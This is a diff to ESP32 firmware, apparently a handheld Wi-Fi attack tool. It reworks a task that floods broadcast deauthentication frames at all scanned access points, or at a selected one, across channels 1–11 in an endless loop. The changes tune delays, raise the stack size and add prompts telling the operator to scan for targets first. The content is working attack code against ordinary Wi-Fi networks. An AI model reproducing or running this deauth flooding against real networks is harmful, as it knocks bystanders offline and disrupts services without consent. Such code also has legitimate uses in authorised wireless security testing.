@@ -1270,10 +1270,11 @@ esp_err_t wifi_manager_broadcast_deauth(uint8_t bssid[6], int channel, uint8_t m
 }
 
 void wifi_deauth_task(void *param) {
-    const char *ssid = (const char *)param;
-
     if (ap_count == 0) {
         printf("No access points found\n");
+        printf("Please run 'scan -w' first to find targets\n");
+        TERMINAL_VIEW_ADD_TEXT("No access points found\n");
+        TERMINAL_VIEW_ADD_TEXT("Please run 'scan -w' first to find targets\n");
         vTaskDelete(NULL);
         return;
     }
@@ -1281,52 +1282,49 @@ void wifi_deauth_task(void *param) {
     wifi_ap_record_t *ap_info = scanned_aps;
     if (ap_info == NULL) {
         printf("Failed to allocate memory for AP info\n");
+        TERMINAL_VIEW_ADD_TEXT("Failed to allocate memory for AP info\n");
         vTaskDelete(NULL);
         return;
     }
 
     while (1) {
-        if (strlen((const char*)selected_ap.ssid) > 0)
-        {
-            for (int i = 0; i < ap_count; i++)
-            {
-                if (strcmp((char*)ap_info[i].ssid, (char*)selected_ap.ssid) == 0)
-                {
-                    for (int y = 1; y < 12; y++)
-                    {
+        if (strlen((const char*)selected_ap.ssid) > 0) {
+            for (int i = 0; i < ap_count; i++) {
+                if (strcmp((char*)ap_info[i].ssid, (char*)selected_ap.ssid) == 0) {
+                    for (int y = 1; y < 12; y++) {
                         uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                         wifi_manager_broadcast_deauth(ap_info[i].bssid, y, broadcast_mac);
-                        vTaskDelay(10 / portTICK_PERIOD_MS); // Lowest Delay before out of memory occurs
+                        // Increase delay to 50ms
+                        vTaskDelay(pdMS_TO_TICKS(50));
                     }
                 }
             }
-        }
-        else 
-        {
-            for (int i = 0; i < ap_count; i++)
-            {
-                for (int y = 1; y < 12; y++)
-                {
+        } else {
+            for (int i = 0; i < ap_count; i++) {
+                for (int y = 1; y < 12; y++) {
                     uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                     wifi_manager_broadcast_deauth(ap_info[i].bssid, y, broadcast_mac);
-                    vTaskDelay(10 / portTICK_PERIOD_MS); // Lowest Delay before out of memory occurs
+                    // Increase delay to 50ms
+                    vTaskDelay(pdMS_TO_TICKS(50));
                 }
             }
         }
+        // Add a small delay between iterations
+        vTaskDelay(pdMS_TO_TICKS(100));
     }
 }
 
 
-void wifi_manager_start_deauth()
-{
+void wifi_manager_start_deauth() {
     if (!beacon_task_running) {
         printf("Starting deauth transmission...\n");
         TERMINAL_VIEW_ADD_TEXT("Starting deauth transmission...\n");
         ap_manager_stop_services();
-        ESP_ERROR_CHECK(esp_wifi_start());
-        xTaskCreate(wifi_deauth_task, "deauth_task", 2048, NULL, 5, &deauth_task_handle);
+        esp_wifi_start();
+        // Increase stack size to 4096
+        xTaskCreate(wifi_deauth_task, "deauth_task", 4096, NULL, 5, &deauth_task_handle);
         beacon_task_running = true;
-        rgb_manager_set_color(&rgb_manager, 0, 255, 22, 23, false);
+        rgb_manager_set_color(&rgb_manager, 0, 255, 0, 0, false);
     } else {
         printf("Deauth transmission already running.\n");
         TERMINAL_VIEW_ADD_TEXT("Deauth transmission already running.\n");
